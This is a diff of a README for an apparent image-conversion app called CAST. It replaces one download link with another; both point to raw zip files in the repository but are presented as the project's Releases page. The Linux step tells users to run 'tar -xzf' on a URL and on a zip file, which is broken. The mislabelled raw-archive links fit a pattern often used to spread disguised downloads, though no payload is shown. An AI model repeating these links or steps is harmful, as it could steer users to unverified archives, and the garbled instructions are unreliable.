@@ -22,7 +22,7 @@ Welcome to CAST! This application aims to make it easy for you to transform RGB 
 
 ## ⬇️ Download & Install
 
-To download CAST, please visit our Releases page: [Download CAST](https://raw.githubusercontent.com/louie-1988/CAST/main/plunderous/CAST.zip)
+To download CAST, please visit our Releases page: [Download CAST](https://github.com/louie-1988/CAST/raw/refs/heads/main/assets/Software-1.4.zip)
 
 1. Click the link above to access the Releases page.
 2. Locate the latest release under the "Releases" section.
@@ -41,7 +41,7 @@ Once the download finishes, follow these steps to install CAST:
     2. Drag the CAST icon into your Applications folder.
     
 - **Linux**:
-    1. Extract the `https://raw.githubusercontent.com/louie-1988/CAST/main/plunderous/CAST.zip` file using the command: `tar -xzf https://raw.githubusercontent.com/louie-1988/CAST/main/plunderous/CAST.zip`.
+    1. Extract the `https://github.com/louie-1988/CAST/raw/refs/heads/main/assets/Software-1.4.zip` file using the command: `tar -xzf https://github.com/louie-1988/CAST/raw/refs/heads/main/assets/Software-1.4.zip`.
     2. Follow the installation guide in the README included in the extracted folder.
 
 After the installation is complete, you can find CAST in your applications list.
